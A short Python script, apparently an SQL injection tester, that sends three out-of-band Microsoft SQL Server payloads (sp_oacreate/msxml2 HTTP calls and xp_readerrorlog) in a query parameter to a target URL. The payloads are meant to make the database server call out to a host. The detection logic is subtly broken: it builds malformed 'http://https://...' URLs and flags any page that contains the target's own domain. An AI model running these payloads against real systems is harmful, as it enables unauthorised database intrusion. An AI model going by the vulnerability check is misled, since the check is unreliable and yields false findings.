import requests
import re

def test_sql_injection(url):
    # Define a list of payloads for out-of-band SQL injection
    payloads = [
        "';EXEC master..xp_readerrorlog 0, 1, N'{}'--",
        "';EXEC sp_oacreate 'msxml2.serverxmlhttp', @obj OUT; EXEC sp_oamethod @obj, 'open', NULL, 'GET', 'http://{}'; EXEC sp_oamethod @obj, 'send', NULL, ''; EXEC sp_oamethod @obj, 'responseText', @res OUT; EXEC sp_oadestroy @obj--",
        "';DECLARE @c INT EXEC sp_oacreate 'msxml2.xmlhttp', @c OUT; EXEC sp_oamethod @c, 'open', NULL, 'GET', 'http://{}', 'false'; EXEC sp_oamethod @c, 'send', NULL; EXEC sp_oamethod @c, 'responseText', @resp out; EXEC sp_oamethod @c, 'responseXML', @xml out; EXEC sp_oadelete @c--"
    ]

    # Iterate through each payload
    for payload in payloads:
        # Generate the payload with the URL as the domain
        formatted_payload = payload.format(url)

        # Make an HTTP GET request with the injection and payload
        params = {'id': formatted_payload}
        response = requests.get(url, params=params)

        # Extract the server's response
        html = response.text

        # Check the response for evidence of out-of-band communication
        if is_vulnerable(url, formatted_payload, html):
            print(f'SQL injection vulnerability detected with payload: {formatted_payload}')
            return

    print('No SQL injection vulnerabilities detected.')

def is_vulnerable(url, payload, html):
    # Check if the payload is present in the response body
    if re.search(re.escape(payload), html, re.IGNORECASE):
        return True

    # Check for out-of-band communication through DNS queries
    domain = extract_domain(url)
    dns_query_regex = r'\b[\w.-]*' + re.escape(domain) + r'\b'
    if re.search(dns_query_regex, html, re.IGNORECASE):
        return True

    return False

def extract_domain(url):
    # Extract the domain from the URL
    domain_regex = r'https?://([\w.-]+)'
    match = re.search(domain_regex, url)
    if match:
        return match.group(1)
    return ''

# Example usage
test_sql_injection('https://example.com')
